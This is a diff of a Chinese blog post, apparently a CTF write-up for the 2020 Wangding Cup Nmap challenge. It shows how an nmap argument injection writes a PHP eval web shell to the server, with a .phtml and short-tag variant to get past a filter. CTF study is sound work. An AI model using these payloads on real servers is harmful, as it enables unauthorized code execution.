@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>categories - test69 - Hexo</title>
+<title>日常练习22——初识nmap命令 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -114,17 +114,17 @@
 
             <div class="page-title">
     <ul>
-        <li class="">
-            <a href="/" data-name="Recent Posts">Recent Posts</a>
-        </li>
+        <li><a href="/">Recent Posts</a></li>
         
-        <li class="">
-            <a href="/categories/tech-notes" data-name="技术">技术</a>
-        </li>
-        
-        <li class="">
-            <a href="/categories/huma" data-name="人文">人文</a>
-        </li>
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
         
         <li class="page-search">
     <form id="search" class="search-form">
@@ -139,44 +139,75 @@
     </ul>
 </div>
 <div class="main-inner">
-    
-        
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-04-24">2021-04-24</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习22——初识nmap命令</h2>
+            <div class="post-meta">
+                emm... 532 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>这道题和之前写的那道onlinetool是一个类型的，都是nmap命令的使用加上escapeshellarg()+escapeshellcmd()的函数漏洞，只不过多了几个小过滤而已。   </p>
+<h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>题目就已经提示的很明白了，就是考察nmap命令的使用，我们直接用上一道题的payload来写入一句话木马：  </p>
+<pre><code>&#39; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#39;  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/60857235d1a9ae528f37d36d.png"><img src="https://img.imgdb.cn/item/60857235d1a9ae528f37d36d.png"></a>  </p>
+<p>发现有东西被过滤了。过滤的是php后缀名，我们使用phtml来绕过后缀，用等号来绕过前面的php字符  </p>
+<pre><code>&#39; &lt;?= eval($_POST[&quot;v&quot;]);?&gt; -oG shell.phtml &#39;    </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608572e9d1a9ae528f3f0d97.png"><img src="https://img.imgdb.cn/item/608572e9d1a9ae528f3f0d97.png"></a>  </p>
+<p>这次没有被拦截，我们查看一下是否写入成功文件。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/60857333d1a9ae528f420b81.png"><img src="https://img.imgdb.cn/item/60857333d1a9ae528f420b81.png"></a></p>
+<p>确实写入成功，接下来我们就可以使用蚁剑来连接或者直接在页面执行命令语句。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608573dcd1a9ae528f494add.png"><img src="https://img.imgdb.cn/item/608573dcd1a9ae528f494add.png"></a>  </p>
+<p>在根目录发现flag。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实就是上一道题目翻版，只不过多了对php的过滤，考察的内容还是一样的，关于nmap命令的使用还是要多加熟悉，不能一眼看到不知道这是什么。</p>
+
             
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
             </a>
-            <em>·</em>2021-04-22
-            
         </div>
-        <a class="post-title" href="/test69/undefined-undefined.html" target="_blank" title="日常练习20">日常练习20</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        日常练习20
-    </div>
-</article>
-
-
-
         
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
     
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
 </div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
 
 
         </div><!-- end #main-->
     </div><!-- end #body -->
     <footer class="footer">
-    <div class="footer-inner" style="text-align: left">
+    <div class="footer-inner" style="text-align: center">
         <p>
             <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
             <!-- 自定义链接 -->
